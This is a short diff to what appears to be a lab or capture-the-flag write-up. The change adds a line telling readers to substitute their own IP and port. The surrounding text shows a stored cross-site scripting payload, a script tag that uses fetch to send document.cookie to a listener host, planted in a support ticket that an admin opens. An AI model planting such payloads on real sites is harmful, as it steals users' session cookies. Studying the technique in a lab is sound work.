@@ -162,6 +162,8 @@ Then we file a ticket carrying a cookie-stealing payload.
 <script>fetch('http://10.200.83.145:8000/?c='+encodeURIComponent(document.cookie))</script>
 ```
 
+Update the IP and port to your own.
+
 The admin opens the ticket and the callback lands, but the cookie value comes back empty.
 
 ```
